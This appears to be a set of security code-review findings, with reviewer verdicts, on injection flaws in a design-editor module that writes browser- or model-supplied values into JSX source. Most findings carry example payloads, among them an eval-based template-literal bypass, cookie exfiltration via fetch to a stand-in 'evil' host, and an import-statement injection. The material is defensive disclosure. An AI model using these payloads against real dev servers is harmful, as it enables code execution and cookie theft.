samples.summary: `isSafeClassToken` allows `$`, `{`, `}`, but `classLiteralOf` can return a template literal — a class token of `${…}` becomes a live JS substitution written into the consumer's source
samples.evidence: The safe-alphabet argument (inject.mjs:92-122) is derived only from the `className="…"` quoted-string context: "the ONLY character that escapes the quoted context is the quote". But `classLiteralOf` (jsx-nodes.mjs:232-263, `asLiteral` returns `ts.isNoSubstitutionTemplateLiteral(n)`) also names BACKTICK literals as the rewrite target, and jsx-nodes.test.mjs:754 pins that `className={`a b`}` is a supported blob. In that context `${` is NOT inert. `rewriteClassLiteral` -> `addClassToken` (inject.mjs:151-157) appends the token just inside the closing backtick, so `applyLayoutProps(src, {anchor, classOps:{additions:['${eval(String.fromCharCode(...))}']}})` against `function C(){ return <div className={`p-4`}/>; }` writes `className={`p-4 ${eval(String.fromCharCode(...))}`}`. `isSafeClassToken` rejects only `" ' ` \` and whitespace — `$`, `{`, `}`, `(`, `)`, digits and commas are all allowed, so a quote-free, whitespace-free arbitrary-code payload passes. Per the module's own threat model (inject.mjs:384-387: values arrive from a browser and "whatever lands in the file is executed by the next HMR reload") this is remote code execution in the dev server, i.e. exactly the hole the guard was written to close, reached through the other literal kind. `replacements[].to` reaches the same splice via inject.mjs:210. Fix: reject `$` (or `${`) when the target literal is a NoSubstitutionTemplateLiteral, or refuse template-literal blobs in `rewriteClassLiteral`.

samples.summary: `applyLayoutInsert` splices `intent.raw` into the source file with zero validation — no parse check, no restriction on `{…}` expression containers or event-handler attributes
samples.evidence: Every other value this module writes is guarded (`renderAttribute` inject.mjs:393-403, `isSafeClassToken` :122, the JSXText guard :537), on the stated basis that values arrive from a browser (and, per docs/design/design-editor/design-editor-engine.md §5.12, from a model) and that what lands in the file is executed by the next HMR reload. `raw` bypasses all of it: inject.mjs:638-639 (`verbatim`) and :649-653 (re-indent only) hand the string straight to `spliceSpan(fileText, offset, offset, snippet)` at :657. A `raw` of `{fetch('//evil?'+document.cookie)}` or `` is spliced into the children region and executes on reload; a `raw` containing `` even leaves the file unparseable. Nothing checks that `raw` parses as JSX or that it contains no JsxExpression/handler. I could not complete the end-to-end chain because the Vite middleware that would feed these intents is not in this PR (grep for `applyLayoutInsert` finds only this module, its tests and docs), so exploitability depends on the not-yet-landed HTTP handler — hence medium confidence, but the primitive is here and the module is the documented sink for browser input. At minimum `raw` should be re-parsed and structurally validated (single JSX element, no expression containers/handlers beyond an allowlist) before being written.

samples.summary: `insertImport` interpolates `spec.module`, `spec.named[]` and `spec.default` into an import statement with no identifier/specifier validation — a quote or brace in any of them injects arbitrary statements
samples.evidence: inject.mjs:859 builds `import ${parts.join(', ')} from '${spec.module}';` by raw interpolation, and the merge path splices the same unvalidated strings into an existing statement at :805 (`${spec.default}, `), :820 (`, ${add.join(', ')}`) and :827. A `module` of `./m'; fetch('//evil'); '` yields `import { C } from './m'; fetch('//evil'); '';`, and a `named` entry of `A } from "./x"; evil(); //` closes the brace group and appends statements. Both land in a file the dev server executes on the next reload — the same class of hole `renderAttribute` (:393) exists to prevent, with no equivalent guard here (grep for identifier validation in packages/design-editor/src found only `renderAttribute`'s name regex and `isSafeClassToken`). No caller exists in-tree yet (grep `insertImport` → only inject.mjs, its two tests and docs), so this is a latent injection in an exported API rather than a live one; confidence is medium for that reason only. Validate `named`/`default` against `/^[A-Za-z_$][\w$]*$/` and `module` against a specifier charset with no quote/backslash/newline.

samples.summary: `renderAttribute` validates the SHAPE of an attribute name but not its meaning — `dangerouslySetInnerHTML`, `srcDoc` and `on*` handlers are all writable from browser-supplied intents
samples.evidence: inject.mjs:394 accepts any `/^[A-Za-z_$][\w$-]*$/` name. Combined with the `expression` path (:395-399) a caller can write `dangerouslySetInnerHTML={props.x}` or `onClick={handlers.anything}` onto any resolvable node, and with the `string` path `srcDoc="…"`/`href="javascript:…"` (only `"` is escaped, `:` and the rest pass). The payload is limited to identifiers already in scope, which is why this is not rated with the injection findings — but chained with the unvalidated `insertImport` above (which can bring an arbitrary module and binding into scope) it becomes a way to attach arbitrary behaviour. I did not confirm a concrete end-to-end chain, hence low confidence. Consider a denylist for `dangerouslySetInnerHTML`/`srcDoc` and for `on*` handler names, and a scheme check for URL-ish attributes.

samples.summary: Rejected attacker-supplied tokens are echoed verbatim into `reason`, which the editor UI displays
samples.evidence: inject.mjs:439 and :473 build `rejected unsafe class tokens: ${rejected.join(', ')}` from the exact hostile input (the test's `EVIL` value `x" onMouseOver={fetch(`//evil`)} y="` is echoed back this way). Refusal messages are the designed UI surface for these results, so if the client ever renders `reason` as HTML/markdown rather than text this becomes reflected XSS in the editor shell. The consuming UI is not in this PR, so I could not confirm the sink — reporting as hardening: truncate or escape echoed tokens, or report a count instead of the raw string.

samples.summary: `unifiedDiff`'s LCS cell cap does not bound allocation when one side is huge and the other tiny
samples.evidence: inject.mjs:1021 guards on `midA.length * midB.length > LCS_CELL_LIMIT` (4e6), but `lcsOps` (:967) allocates `n + 1` separate `Uint32Array` objects. With `midB.length === 1` and `midA.length ≈ 4e6` the product passes the cap while the allocation is ~4M typed-array objects — hundreds of MB and an OOM of the dev server process. Reachable only if an op can produce a multi-million-line delta (e.g. a very large `raw` insert, which is itself unvalidated per the finding above), so confidence is low. Bound `n` and `m` individually as well as their product.

verdict.reason: The finding is accurate in this repository. `isSafeClassToken` (inject.mjs:122) rejects only `" ' ` \` and whitespace, so `$`, `{`, `}`, `(`, `)`, `.`, digits and commas pass — and inject.test.mjs:450-477 intentionally pins that permissiveness. Its justifying comment (inject.mjs:91-118) reasons solely about the `className="…"` StringLiteral context. But `classLiteralOf` also returns backtick literals (`ts.isNoSubstitutionTemplateLiteral` at jsx-nodes.mjs:239-240, return type at jsx-nodes.mjs:232, pinned as supported at jsx-nodes.test.mjs:754), and applyLayoutProps consumes it unconditionally via `lit.getText(sf)` → rewriteClassLiteral (inject.mjs:435-443). addClassToken (inject.mjs:151-157) treats the trailing backtick as the closing quote and appends the token just inside it, landing it in an interpolating `${…}` context; replacements[].to reaches the same splice at inject.mjs:210. A quote-free, whitespace-free payload such as `${eval(String.fromCharCode(...))}` therefore passes the guard and becomes live JS in the consumer's source, which the module's own threat model (inject.mjs:384-387) says the dev server executes on the next HMR reload. No guard elsewhere blocks it: the kind-sensitive branches at inject.mjs:445 and inject.mjs:458-487 are only reached when no literal was found, and renderAttribute's stricter validation (inject.mjs:393-403) is not on this path. The hostile-value tests (inject.test.mjs:392-448) exercise only StringLiteral targets, so the template-literal path is untested, not covered. Injection / unsafe input handling is in the Security lane, and this is a bypass of a guard written for exactly this threat.

verdict.reason: The absence claim holds. `applyLayoutInsert` (packages/design-editor/src/server/inject.mjs:594-658) splices `intent.raw` into the children region with no content validation: `verbatim` passes it through untouched (:638-639), the non-verbatim path only trims trailing whitespace and re-indents (:646-653), and the result goes straight to `spliceSpan(fileText, offset, offset, snippet)` (:657). I searched for a counterexample and found none: repo-wide grep for applyLayoutInsert/layout-insert outside docs yields only this module and its two test files (no production caller that could pre-validate); grep for isSafe|sanitiz|validate|reject|guard across packages/design-editor/src surfaces only the class/attribute/text guards plus resolveNode's structural scope/role guards in jsx-nodes.mjs; grep for parseDiagnostics|getPreEmitDiagnostics|composeIntents|writeFile in src/ returns nothing (post-splice parse checks exist only in tests, e.g. inject.test.mjs:230); grep for __design-editor finds no request handler in this tree. Caveat recorded, not a refutation: the Vite middleware feeding these intents is not in this branch (the structural inspector is marked NOT SHIPPED in docs/tasks/active/20260729-design-editor-layout-sandbox-todo.md:144), so today the only callers are tests — that bounds present exploitability but leaves the unvalidated code-writing primitive in place at the module documented as the sink for browser/model input.

verdict.reason: The cited code is present exactly as described. `renderAttribute` (inject.mjs:393-403) gates the attribute NAME only with a lexical regex `/^[A-Za-z_$][\w$-]*$/` (:394), so `dangerouslySetInnerHTML`, `srcDoc`, and any `on*` handler name pass. The `expression` branch (:395-399) then admits any bare dotted reference, and the `string` branch (:401-402) only special-cases `"`, so `href="javascript:…"` / `srcDoc="…"` are written verbatim. The only call sites are in the same file: :477 (hardcoded 'className', harmless) and :508, which passes caller-supplied `set.name`/`set.value` from `intent.sets` (typed :415) with no allowlist or denylist. I enumerated every caller of `applyLayoutProps` repo-wide via Grep — only test/server/inject.test.mjs and test/server/inject.types.test.mts — so there is no upstream validation to cite as already-guarded. The file's own contract (:383-386) states values arrive from a browser and that whatever is spliced is executed on the next HMR reload; the sibling paths do enforce semantics (`/[{}<>]/` text refusal at :537, `isSafeClassToken` at :471), making the missing semantic check on attribute names a real unsafe-input-handling/injection weakness in this lens's lane. Exploitability is capped because no HTTP endpoint in this package currently invokes it, which matches the reviewer's own major/low-confidence rating but is not a ground for refutation.
